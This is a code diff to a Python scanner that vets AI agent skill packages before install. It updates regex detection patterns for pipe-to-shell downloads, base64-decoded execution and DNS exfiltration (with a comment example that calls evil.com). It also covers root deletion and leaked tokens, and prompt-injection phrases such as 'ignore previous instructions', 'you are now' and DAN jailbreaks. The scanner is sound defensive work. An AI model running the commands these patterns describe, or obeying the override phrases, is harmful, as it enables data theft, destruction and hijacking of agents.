@@ -13,12 +13,12 @@ import hashlib
 import json
 from contextlib import suppress
 from dataclasses import asdict, dataclass, field
-from datetime import datetime, timezone
+from datetime import datetime, timezone, UTC
 from pathlib import Path
 from typing import List, Tuple
 
 
-SCANNER_VERSION = "skills-guard-v7"
+SCANNER_VERSION = "skills-guard-v9"
 
 # NVIDIA-verified skills each ship a signed `skill.oms.sig` + governance `skill-card.md`.
 TRUSTED_REPOS = {"openai/skills", "anthropics/skills", "huggingface/skills", "NVIDIA/skills"}
@@ -52,7 +52,7 @@ class ScanResult:
     source: str
     trust_level: str    # "builtin" | "trusted" | "community" | "agent-created"
     verdict: str        # "safe" | "caution" | "dangerous"
-    findings: List[Finding] = field(default_factory=list)
+    findings: list[Finding] = field(default_factory=list)
     scanned_at: str = ""
     summary: str = ""
     scan_provenance: dict = field(default_factory=dict)
@@ -121,7 +121,9 @@ _NOT_DELEGATE = (
 
 # POSIX shell names as one shared alternation, so every pipe-to-shell pattern below flags the
 # same set (the narrower `(ba)?sh` let `curl url | zsh` through while bash/sh were caught).
-_SHELL_NAMES_RE = r'(?:bash|sh|zsh|ksh|dash)'
+# Word-bounded: `| sha256sum -c` / `| shasum` / `| dashboard` are not `| sh` / `| dash`.
+_SHELL_NAMES_RE = r'(?:bash|sh|zsh|ksh|dash)\b'
+_SUDO_PREFIX = r'(?:sudo\s+(?:-\S+\s+)*)?'
 
 # Known credential-file paths as one shared alternation for the JavaScript and Python
 # read-secrets patterns (a private key, .env, credentials, .netrc, .pgpass, .npmrc, .pypirc;
@@ -195,7 +197,14 @@ THREAT_PATTERNS = [
     # optional -flags with values, +opts, @server) carries the interpolation. Anything
     # looser fires on the English noun in prose ("set the host value and run
     # `${SKILL_DIR}/x`") and on flag names such as llama.cpp `--host 127.0.0.1 --port $PORT`.
-    (r'(?<![-/])\b(dig|nslookup|host)\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?[^\s"\'$]*\$',
+    # `host` is also an English noun and an HTTP header, so it needs the exfil shape itself —
+    # an interpolation INSIDE a domain name (`host $(whoami).evil.com`, `host ${D}.x.io`) — or a
+    # shell command position (`; host $NAME`, `do host $c`); "the connected host (${id})", a JS
+    # `host ${resp.status}: …` message and nginx `Host $host;` are none of those.
+    (r'(?<![-/])\b(?:dig|nslookup)\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?[^\s"\'$]*\$'
+     r'|(?<![-/])\bhost\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?[^\s"\'$()]*'
+     r'\$(?:\{[^}\s]*\}|\([^\n]*?\)+|\w+)[\w-]*\.[a-z]'
+     r'|(?:^|[;&|]|\$\(|\b(?:do|then|else)\b)\s*host\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?\$',
      "dns_exfil", "critical", "exfiltration", "DNS lookup with variable interpolation (possible DNS exfiltration)"),
     (r'>\s*/tmp/[^\s]*\s*&&\s*(curl|wget|nc|python)',  # no-tmp: ok — malicious-pattern regex
      "tmp_staging", "critical", "exfiltration", "writes to /tmp then exfiltrates"),  # no-tmp: ok — malicious-pattern label
@@ -207,8 +216,11 @@ THREAT_PATTERNS = [
     (r'ignore\s+(?:\w+\s+)*(previous|all|above|prior)\s+instructions',
      "prompt_injection_ignore", "critical", "injection", "prompt injection: ignore previous instructions"),
     (r'you\s+are\s+(?:\w+\s+)*now\s+', "role_hijack", "high", "injection", "attempts to override the agent's role"),
-    # Concealment only — the lookahead exempts UX guidance ("don't tell the user X unless Y confirms").
-    (r'do\s+not\s+(?:\w+\s+)*tell\s+(?:\w+\s+)*the\s+user(?!.*\b(?:unless|except|until|confirm|diagnose|verify|check)\b)',
+    # Concealment only — the lookahead exempts UX guidance ("don't tell the user X unless Y confirms")
+    # and a tone rule that QUOTES the phrase the agent should not say (`Do not tell the user to
+    # "be careful with terminal."`); an unquoted `to ...` is still an instruction and fires.
+    (r'do\s+not\s+(?:\w+\s+)*tell\s+(?:\w+\s+)*the\s+user(?!\s+to\s+["\'\u201c\u2018])'
+     r'(?!.*\b(?:unless|except|until|confirm|diagnos\w*|verify|check)\b)',
      "deception_hide", "high", "injection", "instructs agent to hide information from user"),
     (r'system\s+(?:\w+\s+)*prompt\s+(?:\w+\s+)*override',
      "sys_prompt_override", "critical", "injection", "attempts to override the system prompt"),
@@ -224,17 +236,31 @@ THREAT_PATTERNS = [
      "bypass_restrictions", "critical", "injection", "instructs agent to act without restrictions"),
     (r'translate\s+.*\s+into\s+.*\s+and\s+(execute|run|eval)',
      "translate_execute", "critical", "injection", "translate-then-execute evasion technique"),
-    (r'<!--[^>]*(?:ignore|override|system|secret|hidden)[^>]*-->',
+    # Injection phrasing inside the comment, not a bare keyword: `<!-- Original size, ignore container -->`
+    # and `<!-- Requires SYSTEM_ALERT_WINDOW -->` are layout/doc notes.
+    (r'<!--[^>]*(?:\b(?:ignore|forget|disregard|override)\s+(?:\w+\s+)*?'
+     r'(?:previous|prior|above|earlier|all|any|your|the)\s+(?:\w+\s+)*?'
+     r'(?:instructions?|rules|prompts?|guidelines|directions|restrictions)'
+     r'|\bsystem\s*(?:prompt|message|instructions?|override)|\b(?:override|secret|hidden|system)\s*:'
+     r'|\b(?:ignore|override|bypass|disable)\s+(?:\w+\s+)*?(?:safety|security|guardrails|filters)\b'
+     r'|\b(?:secret|hidden|new)\s+(?:instructions?|commands?|directives?|tasks?)\b|\byou\s+are\s+now\b'
+     r'|\bdo\s+not\s+(?:tell|reveal|show|mention|inform)\b'
+     r'|\b(?:note|message)\s+(?:to|for)\s+(?:the\s+)?(?:ai|agent|assistant|model|llm)\b)[^>]*-->',
      "html_comment_injection", "high", "injection", "hidden instructions in HTML comments"),
     (r'<\s*div\s+style\s*=\s*["\'][\s\S]*?display\s*:\s*none',
      "hidden_div", "high", "injection", "hidden HTML div (invisible instructions)"),
     # ── Destructive operations ──
     # Cleanup under the standard temp roots (/tmp, /var/tmp, /dev/shm, /run) is routine in
-    # test/smoke scripts and CI. A parent segment inside an exempted root can escape it,
-    # so it remains destructive along with every other path rooted at "/".
-    (r'rm\s+-rf\s+/(?:'
-     r'(?!tmp(?:\b|/)|var/tmp(?:\b|/)|dev/shm(?:\b|/)|run(?:\b|/))'
-     r'|(?:tmp|var/tmp|dev/shm|run)/(?:[^/\s]*/)*\.\.(?=/|[\s;&|]|$))',
+    # test/smoke scripts and CI, and so is the package-cache cleanup that ends every Dockerfile
+    # install layer (`rm -rf /var/lib/apt/lists/*`, /var/cache/{apt,apk,yum,dnf}). A parent
+    # segment inside an exempted root can escape it, so it remains destructive along with every
+    # other path rooted at "/". Every operand is checked (`rm -rf /tmp/x /etc`,
+    # `rm -rf --no-preserve-root /`), not only the first. A later bare `//` token is a JS/JSONC
+    # comment opener (`"rm -rf dist", // clean`), not the root; operands after it are still
+    # checked (`rm -rf x // /etc` deletes /etc in a shell). A first-operand `//` is the root.
+    (r'rm\s+-rf\s+((?:[^\s;&|<>#][^\s;&|<>]*\s+)+?)?/(?(1)(?!/(?:\s|$)))(?:'
+     r'(?!(?:tmp|var/tmp|dev/shm|run|var/lib/apt/lists|var/cache/(?:apt|apk|yum|dnf))(?:\b|/))'
+     r'|(?:tmp|var/tmp|dev/shm|run|var/lib/apt/lists|var/cache/(?:apt|apk|yum|dnf))/(?:[^/\s]*/)*\.\.(?=/|[\s;&|]|$))',
      "destructive_root_rm", "critical", "destructive", "recursive delete from root"),
     (r'rm\s+(-[^\s]*)?r.*(?:\$HOME|~[/\s*]|~$)|\brmdir\s+.*(?:\$HOME|~[/\s*]|~$)',
      "destructive_home_rm", "critical", "destructive", "recursive delete targeting home directory ($HOME or ~)"),
@@ -283,11 +309,25 @@ THREAT_PATTERNS = [
     (r'pastebin\.com|hastebin\.com|ghostbin\.',
      "paste_service", "medium", "network", "references paste service (possible data staging)"),
     # ── Obfuscation: encoding and eval ──
-    (r'base64\s+(-d|--decode)\s*\|', "base64_decode_pipe", "high", "obfuscation", "base64 decodes and pipes to execution"),
+    # The decode may read a file or a redirect before the pipe (`base64 -d payload.b64 | sh`,
+    # `base64 --decode < p | sh`), short flags may be combined (`-di`), and openssl decodes base64
+    # too. Execution means an interpreter in command position at ANY later stage of the line
+    # (`| gunzip | sh`, `| tee x.sh; sh x.sh`), or an archive unpacker: an embedded base64 tarball
+    # is code the scanner never sees. Decoding into a data consumer (`| jq .`, `| grep`) is not.
+    (r'(?:\bbase64\s+(?:-[^\s|]+\s+)*?(?:-[a-z]*d[a-z]*|--decode)\b|\bopenssl\s+(?:base64|enc)\b[^|;&\n]*?\s-d\b)'
+     r'[^\n]*?(?:\||;|&&)\s*(?:\w+=\S*\s+)*(?:\S*/)?'
+     r'(?:sh|bash|zsh|ksh|dash|fish|python[\d.]*|perl|ruby|node|nodejs|php|eval|source|exec|xargs|env|sudo'
+     r'|iex|pwsh|powershell|tar|bsdtar|unzip|cpio|gunzip|gzip|zcat|xz|unxz|bunzip2|\.(?=\s))(?![\w.-])'
+     r'|\b(?:eval|source|iex|exec)\b[^\n]*\bbase64\s+(?:-[^\s|]+\s+)*?(?:-[a-z]*d[a-z]*|--decode)\b',
+     "base64_decode_pipe", "high", "obfuscation", "base64 decodes and pipes to execution"),
     (r'\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}',
      "hex_encoded_string", "medium", "obfuscation", "hex-encoded string (possible obfuscation)"),
     (r'\beval\s*\(\s*["\']', "eval_string", "high", "obfuscation", "eval() with string argument"),
-    (r'\bexec\s*\(\s*["\']', "exec_string", "high", "obfuscation", "exec() with string argument"),
+    # An upper-case SQL statement is a database call (`db.exec('PRAGMA busy_timeout=2000')`,
+    # node:sqlite / better-sqlite3), never code or a shell command line.
+    (r'\bexec\s*\(\s*["\'](?!(?-i:PRAGMA|BEGIN|COMMIT|ROLLBACK|CREATE|INSERT|SELECT|UPDATE|DELETE|DROP|ALTER'
+     r'|VACUUM|SAVEPOINT|RELEASE|ANALYZE|REINDEX|ATTACH|DETACH|REPLACE)\b)',
+     "exec_string", "high", "obfuscation", "exec() with string argument"),
     (rf'echo\s+[^\n]*\|\s*(?:{_SHELL_NAMES_RE}|python|perl|ruby|node)',
      "echo_pipe_exec", "critical", "obfuscation", "echo piped to interpreter for execution"),
     (r'compile\s*\(\s*[^\)]+,\s*["\'].*["\']\s*,\s*["\']exec["\']\s*\)',
@@ -331,10 +371,14 @@ THREAT_PATTERNS = [
     (r'xmrig|stratum\+tcp|monero|coinhive|cryptonight', "crypto_mining", "critical", "mining", "cryptocurrency mining reference"),
     (r'hashrate|nonce.*difficulty', "mining_indicators", "medium", "mining", "possible cryptocurrency mining indicators"),
     # ── Supply chain: curl/wget pipe to shell ──
-    (rf'curl\s+[^\n]*\|\s*{_SHELL_NAMES_RE}', "curl_pipe_shell", "critical", "supply_chain", "curl piped to shell (download-and-execute)"),
-    (rf'wget\s+[^\n]*-O\s*-\s*\|\s*{_SHELL_NAMES_RE}',
+    # `curl` needs an operand before the pipe (#118155): the bare phrase `curl | sh` is prose shorthand for the
+    # install method, and curl with no URL fetches nothing. A real download-and-execute names its source, so
+    # requiring one non-pipe character after the command costs no coverage.
+    # `| sudo -E bash` is the same download-and-execute, with root.
+    (rf'curl\s+[^|\s][^\n]*\|\s*{_SUDO_PREFIX}{_SHELL_NAMES_RE}', "curl_pipe_shell", "critical", "supply_chain", "curl piped to shell (download-and-execute)"),
+    (rf'wget\s+[^\n]*-O\s*-\s*\|\s*{_SUDO_PREFIX}{_SHELL_NAMES_RE}',
      "wget_pipe_shell", "critical", "supply_chain", "wget piped to shell (download-and-execute)"),
-    (r'curl\s+[^\n]*\|\s*python', "curl_pipe_python", "critical", "supply_chain", "curl piped to Python interpreter"),
+    (rf'curl\s+[^|\s][^\n]*\|\s*{_SUDO_PREFIX}python', "curl_pipe_python", "critical", "supply_chain", "curl piped to Python interpreter"),
     # ── Supply chain: unpinned/deferred dependencies ──
     (r'#\s*///\s*script.*dependencies',
      "pep723_inline_deps", "medium", "supply_chain", "PEP 723 inline script metadata with dependencies (verify pinning)"),
@@ -356,8 +400,14 @@ THREAT_PATTERNS = [
     # `\bsudo\b` made every such plugin `caution`. A dotted event name is never a shell `sudo`.
     (r'\bsudo\b(?!\.(?:request|respond)\b)',
      "sudo_usage", "high", "privilege_escalation", "uses sudo (privilege escalation)"),
-    (r'setuid|setgid|cap_setuid',
+    # Critical only in an executing shape: a set*id() call, the cap_setuid/cap_setgid capability, or a
+    # chmod setting the bit (`u+s`, `g=s`, octal 2xxx-7xxx). The bare word is prose ("no setuid
+    # attributes") or a flag name (`--disable-setuid-sandbox`): an informational note.
+    (r'(?<![a-z])set(?:e|re|res)?[ug]id\s*\(|\bcap_set[ug]id\b'
+     r'|\bchmod\s+(?:-\w+\s+)*(?:[ugoa]*[+=][rwxXt]*s|0?[2-7][0-7]{3}\b)',
      "setuid_setgid", "critical", "privilege_escalation", "setuid/setgid (privilege escalation mechanism)"),
+    (r'(?<!cap_)set[ug]id(?!\s*\()',
+     "setuid_setgid", "medium", "privilege_escalation", "mentions setuid/setgid (informational)"),
     (r'NOPASSWD',
      "nopasswd_sudo", "critical", "privilege_escalation", "NOPASSWD sudoers entry (passwordless privilege escalation)"),
     (r'chmod\s+[u+]?s', "suid_bit", "critical", "privilege_escalation", "sets SUID/SGID bit on a file"),
@@ -401,15 +451,20 @@ THREAT_PATTERNS = [
      r'(?!(?-i:[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+)["\'])'
      r'[A-Za-z0-9+/=_-]{20,}',
      "hardcoded_secret", "critical", "credential_exposure", "possible hardcoded API key, token, or secret"),
-    (r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----',
+    (r'(?-i:-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----)',
      "embedded_private_key", "critical", "credential_exposure", "embedded private key"),
-    (r'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{80,}',
+    # Provider token shapes are case-fixed (`ghp_`, `sk-`, `glpat-`, `AKIA`) and the table compiles
+    # with IGNORECASE, so each one is scoped case-sensitive like the AWS pattern below.
+    (r'(?-i:ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{80,})',
      "github_token_leaked", "critical", "credential_exposure", "GitHub personal access token in skill content"),
-    (r'sk-[A-Za-z0-9]{20,}', "openai_key_leaked", "critical", "credential_exposure", "possible OpenAI API key in skill content"),
-    (r'sk-ant-[A-Za-z0-9_-]{90,}',
+    (r'(?-i:sk-[A-Za-z0-9]{20,})', "openai_key_leaked", "critical", "credential_exposure", "possible OpenAI API key in skill content"),
+    (r'(?-i:sk-ant-[A-Za-z0-9_-]{90,})',
      "anthropic_key_leaked", "critical", "credential_exposure", "possible Anthropic API key in skill content"),
-    (r'AKIA[0-9A-Z]{16}', "aws_access_key_leaked", "critical", "credential_exposure", "AWS access key ID in skill content"),
-    (r'glpat-[A-Za-z0-9_\-]{20,}',
+    # AWS access key IDs are all-caps by spec. Scoped case-sensitive — the table compiles with
+    # IGNORECASE, and a case-folded AKIA+16 inside a base64-encoded asset is a byte collision,
+    # not a key (#132155); one such false critical hard-blocks the whole plugin install.
+    (r'(?-i:AKIA[0-9A-Z]{16})', "aws_access_key_leaked", "critical", "credential_exposure", "AWS access key ID in skill content"),
+    (r'(?-i:glpat-[A-Za-z0-9_\-]{20,})',
      "gitlab_token_leaked", "critical", "credential_exposure", "GitLab personal access token in skill content"),
     # ── Additional prompt injection: jailbreak patterns ──
     (r'\bDAN\s+mode\b|Do\s+Anything\s+Now', "jailbreak_dan", "critical", "injection", "DAN (Do Anything Now) jailbreak attempt"),
@@ -482,7 +537,7 @@ def _statement_owners(lines: list) -> list:
 
 
 def _demote_inert_path_reference(pid: str, severity: str, description: str, line: str, owner_line: str,
-                                 suffix: str) -> Tuple[str, str]:
+                                 suffix: str) -> tuple[str, str]:
     """``(severity, description)`` for a path-token match, lowered when the line cannot act where it sits."""
     if pid not in _PATH_REFERENCE_PATTERN_IDS:
         return severity, description
@@ -577,13 +632,13 @@ _FENCE_LINE = re.compile(r"^ {0,3}(?P<marker>`{3,}|~{3,})(?P<info>.*)$")
 _CONTAINER_PREFIX = re.compile(r"^(?: {0,3}(?:>|(?:[-*+]|\d{1,9}[.)]) {1,4}))+")
 
 
-def _mask_prose_link_destinations(lines: List[str]) -> List[str]:
+def _mask_prose_link_destinations(lines: list[str]) -> list[str]:
     """Mask link destinations only in Markdown prose. Inside a fenced or indented code block a
     ``[x](../..)`` is an argument to whatever command surrounds it, not a hyperlink, so those lines
     scan verbatim. Fence state is ``(marker_char, opener_length)`` rather than a bool so a
     mismatched fence line cannot drop the scanner back into prose mode; an unclosed fence stays
     code to EOF (fail-safe)."""
-    out: List[str] = []
+    out: list[str] = []
     fence = None  # (marker char, opener length) while a fenced block is open
     for line in lines:
         match = _FENCE_LINE.match(_CONTAINER_PREFIX.sub("", line))
@@ -600,7 +655,7 @@ def _mask_prose_link_destinations(lines: List[str]) -> List[str]:
     return out
 
 
-def scan_file(file_path: Path, rel_path: str = "") -> List[Finding]:
+def scan_file(file_path: Path, rel_path: str = "") -> list[Finding]:
     """Threat-pattern + invisible-unicode scan of one file; *rel_path* is the display path (default: file
     name). Regex findings dedupe per pattern per line; invisible chars yield one per line."""
     rel_path = rel_path or file_path.name
@@ -632,12 +687,28 @@ def scan_file(file_path: Path, rel_path: str = "") -> List[Finding]:
     return findings
 
 
+# Findings that only inform on a COMMUNITY skill install, where the matched text cannot act:
+# ``sudo_usage`` / ``bind_all_interfaces`` in Markdown — setup docs (`sudo apt install`,
+# `runserver 0.0.0.0:8000` in a Dockerfile CMD) are not executed by installing; running them goes
+# through the terminal tool and its approval gate. Scripts keep the full severity.
+# ``inline_shell_exec`` stays high: the runtime's community gate keys on the hub lock entry's own
+# directory, so a nested SKILL.md, an external_dirs view or an unreadable lock still expands it.
+_DOC_NOTE_IDS = frozenset({"sudo_usage", "bind_all_interfaces"})
+
+
+def _community_note(f: Finding) -> Finding:
+    if f.severity in ("critical", "high") and (
+            f.pattern_id in _DOC_NOTE_IDS and f.file.lower().endswith(".md")):
+        f.severity, f.description = "medium", f"{f.description} (not executed on install; informational)"
+    return f
+
+
 def scan_skill(skill_path: Path, source: str = "community") -> ScanResult:
     """Structural checks + pattern scan of every text file in a skill dir (or a single file). A gitignore-style
     `.skillignore` / `.clawhubignore` excludes dev/docs artifacts from BOTH passes; the ignore file itself is
     always excluded and `SKILL.md` can never be un-ignored. *source* (e.g. "openai/skills") sets the trust level."""
     name, trust = skill_path.name, _resolve_trust_level(source)
-    findings: List[Finding] = []
+    findings: list[Finding] = []
     if skill_path.is_dir():
         ignore = _load_skill_ignore(skill_path)
         findings.extend(_check_structure(skill_path, ignore=ignore))
@@ -646,8 +717,10 @@ def scan_skill(skill_path: Path, source: str = "community") -> ScanResult:
                 findings.extend(scan_file(f, rel))
     elif skill_path.is_file():
         findings.extend(scan_file(skill_path, skill_path.name))
+    if trust == "community":
+        findings = [_community_note(f) for f in findings]
     verdict = _determine_verdict(findings)
-    return ScanResult(name, source, trust, verdict, findings, datetime.now(timezone.utc).isoformat(),
+    return ScanResult(name, source, trust, verdict, findings, datetime.now(UTC).isoformat(),
                       _build_summary(name, source, trust, verdict, findings))
 
 
@@ -676,12 +749,12 @@ def content_hash(skill_path: Path) -> str:
 
 
 def scan_skill_cached(skill_path: Path, source: str = "community", *, source_url: str = "",
-                      cache_dir: Path | None = None) -> Tuple[ScanResult, dict]:
+                      cache_dir: Path | None = None) -> tuple[ScanResult, dict]:
     """Scan plus attestation dict; the cache (keyed by content digest + source identity) only serves exact
     current content under the current scanner version."""
     digest = _content_digest(skill_path)
     cache_root = cache_dir or skill_path.parent / ".scan-cache"
-    source_identity = hashlib.sha256(f"{source}\0{source_url}".encode("utf-8")).hexdigest()[:16]
+    source_identity = hashlib.sha256(f"{source}\0{source_url}".encode()).hexdigest()[:16]
     cache_file = cache_root / f"{digest}-{source_identity}.json"
     expected = {"bundle_hash": f"sha256:{digest}", "scanner_version": SCANNER_VERSION, "source": source,
                 "source_url": source_url}
@@ -706,7 +779,7 @@ def scan_skill_cached(skill_path: Path, source: str = "community", *, source_url
     return result, provenance
 
 
-def should_allow_install(result: ScanResult, force: bool = False) -> Tuple[bool, str]:
+def should_allow_install(result: ScanResult, force: bool = False) -> tuple[bool, str]:
     """``(allowed, reason)`` from verdict + trust; *force* overrides every block except a dangerous verdict on
     community/trusted sources. ``allowed`` is None when policy says "ask"."""
     decision = INSTALL_POLICY.get(result.trust_level, INSTALL_POLICY["community"])[VERDICT_INDEX.get(result.verdict, 2)]
@@ -736,7 +809,7 @@ def format_scan_report(result: ScanResult) -> str:
     return "\n".join(lines + [f"Decision: {status} — {reason}"])
 
 
-def _check_structure(skill_dir: Path, ignore=None) -> List[Finding]:
+def _check_structure(skill_dir: Path, ignore=None) -> list[Finding]:
     """Structural anomalies (counts, sizes, binaries, stray executables, escaping symlinks); *ignore(rel) -> bool*
     excludes paths from every count and finding."""
     findings = []
@@ -790,7 +863,7 @@ def _load_skill_ignore(skill_dir: Path):
     lines and ``#`` comments skipped; trailing ``/`` = directory (it and everything under it); ``*``/``?`` globs via
     fnmatch on the full path and each segment; leading ``/`` anchors to the root. Ignore files always excluded;
     ``SKILL.md`` never."""
-    patterns: List[str] = []
+    patterns: list[str] = []
     for ig in (skill_dir / name for name in _SKILL_IGNORE_FILENAMES):
         with suppress(UnicodeDecodeError, OSError):
             if ig.is_file():
@@ -837,13 +910,13 @@ def _resolve_trust_level(source: str) -> str:
     return "trusted" if any(src == t or src.startswith(f"{t}/") for t in TRUSTED_REPOS) else "community"
 
 
-def _determine_verdict(findings: List[Finding]) -> str:
+def _determine_verdict(findings: list[Finding]) -> str:
     """critical → dangerous, high → caution; medium/low alone are informational (safe)."""
     sev = {f.severity for f in findings}
     return "dangerous" if "critical" in sev else "caution" if "high" in sev else "safe"
 
 
-def _build_summary(name: str, source: str, trust: str, verdict: str, findings: List[Finding]) -> str:
+def _build_summary(name: str, source: str, trust: str, verdict: str, findings: list[Finding]) -> str:
     if not findings:
         return f"{name}: clean scan, no threats detected"
     return f"{name}: {verdict} — {len(findings)} finding(s) in {', '.join(sorted({f.category for f in findings}))}"
